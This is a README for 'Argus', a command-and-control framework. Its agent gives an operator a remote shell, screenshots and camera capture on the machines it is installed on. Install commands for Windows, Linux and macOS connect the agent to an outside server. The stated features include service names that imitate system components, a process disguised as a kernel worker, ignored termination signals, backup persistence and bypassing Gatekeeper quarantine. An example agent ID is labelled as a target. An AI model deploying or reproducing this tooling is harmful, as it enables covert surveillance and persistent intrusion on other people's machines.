# Argus

C2 framework with WebSocket agent — shell, screenshot, and camera capture. Agents install as persistent system services and resist termination.

**Server:** Docker container on the homelab (`docker-svc`) — operator UI behind Pocket ID OIDC, `/ws/agent` token-only
**Operator UI:** `https://argus.lanarchy.net` (login with the operator password)

---

## Agent Installation

### Prerequisites

- **Server URL:** `wss://argus.lanarchy.net`
- **Agent token:** retrieve from the operator UI after server deployment
- The install command is the same on all platforms — replace the token placeholder below

---

### Windows

**Requires:** Admin PowerShell

```powershell
# Clone the repo (use a GitHub personal access token as the password)
git clone https://github.com/andrewhannaford/argus.git
cd argus

# Install as a Windows service
.\dist\agent-windows-amd64.exe --install `
  --server wss://argus.lanarchy.net `
  --token <AGENT_TOKEN>
```

**What it installs:**
- Service name: `WdiSystemHost32` ("Diagnostic System Host")
- Runs as SYSTEM, starts automatically at boot
- Binary deployed to `%SystemRoot%\System32\wdisystemhost.exe`
- Registry Run key + scheduled task added as backup persistence

**Verify:**
```powershell
sc query WdiSystemHost32
```

**Uninstall:**
```powershell
.\dist\agent-windows-amd64.exe --uninstall
```

---

### Linux

**Requires:** root / sudo

```bash
git clone https://github.com/andrewhannaford/argus.git
cd argus

sudo ./dist/agent-linux-amd64 --install \
  --server wss://argus.lanarchy.net \
  --token <AGENT_TOKEN>
```

**What it installs:**
- systemd service: `systemd-hostnamed-ext`
- Runs as root, starts automatically at boot (`Restart=always`)
- Process renamed to `kworker/u4:2` (visible in top/ps)
- SIGTERM/SIGHUP ignored — requires SIGKILL to stop

**Verify:**
```bash
systemctl status systemd-hostnamed-ext
```

**Uninstall:**
```bash
sudo ./dist/agent-linux-amd64 --uninstall
```

---

### macOS

**Requires:** root / sudo  
**Apple Silicon (M1/M2/M3):** use `agent-darwin-arm64`  
**Intel:** use `agent-darwin-amd64`

```bash
git clone https://github.com/andrewhannaford/argus.git
cd argus

# Remove Gatekeeper quarantine (unsigned binary)
xattr -d com.apple.quarantine dist/agent-darwin-arm64 2>/dev/null || true

sudo ./dist/agent-darwin-arm64 --install \
  --server wss://argus.lanarchy.net \
  --token <AGENT_TOKEN>
```

**What it installs:**
- LaunchDaemon: `com.apple.security.diagnosticd`
- Runs as root, starts automatically at boot (`KeepAlive: true`)
- Logs to `/var/log/com.apple.security.diagnosticd.log`
- SIGTERM/SIGHUP ignored

**Verify:**
```bash
sudo launchctl list | grep diagnosticd
```

**Uninstall:**
```bash
sudo ./dist/agent-darwin-arm64 --uninstall
```

---

## Agent ID

By default the agent registers using the machine hostname. Override with `--id`:

```bash
--id "target-dc01"
```

---

## Operator UI

Open `https://argus.lanarchy.net` in a browser. Log in with the operator password you created during deployment.

Connected agents appear in the sidebar. Select one to open a shell, take a screenshot, or start the camera feed.

---

## Building from Source

Requires Go 1.26+.

```bash
# All platforms
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w -H windowsgui" -o dist/agent-windows-amd64.exe ./cmd/agent/
GOOS=linux   GOARCH=amd64 go build -ldflags "-s -w" -o dist/agent-linux-amd64  ./cmd/agent/
GOOS=darwin  GOARCH=amd64 go build -ldflags "-s -w" -o dist/agent-darwin-amd64 ./cmd/agent/
GOOS=darwin  GOARCH=arm64 go build -ldflags "-s -w" -o dist/agent-darwin-arm64 ./cmd/agent/

# Server: built by the Dockerfile (see Server Deployment), not by this list.
```

---

## Server Deployment

The server runs on the homelab docker host (`docker-svc`) as its own Compose
project, built from the repo `Dockerfile` and served through Traefik at
`argus.lanarchy.net`. Traefik labels live in `docker-compose.yml`. The operator
UI is gated by Pocket ID OIDC; `/ws/agent` bypasses OIDC (a dedicated router in
the Traefik `dynamic_conf/`) and is protected by the agent token only.

1. Put the source plus `Dockerfile`, `docker-compose.yml` and a real `.env` in
   `/opt/docker/services/argus/` on `docker-svc`. The two secrets are
   `ARGUS_AGENT_TOKEN` (>= 32 random bytes) and `ARGUS_OPERATOR_PASSWORD`.

   `ARGUS_OPERATOR_PASSWORD` is a **bcrypt hash**, not the plaintext. Generate it:

   ```bash
   echo 'your-password' | go run ./cmd/hashpw
   ```

   The hash contains `$`; in the `.env` file each `$` must be doubled (`$$`)
   because Docker Compose interpolates `$VAR` in `.env` values:

   ```
   ARGUS_AGENT_TOKEN=...
   ARGUS_OPERATOR_PASSWORD=$$2a$$10$$...
   ```

   The `$$` becomes a literal `$` inside the container.

2. Build and start:

   ```bash
   cd /opt/docker/services/argus
   docker compose build
   docker compose up -d
   ```

`.env` is not committed (it's gitignored). `cmd/hashpw` is a small helper for
generating (and rotating) the operator password hash.
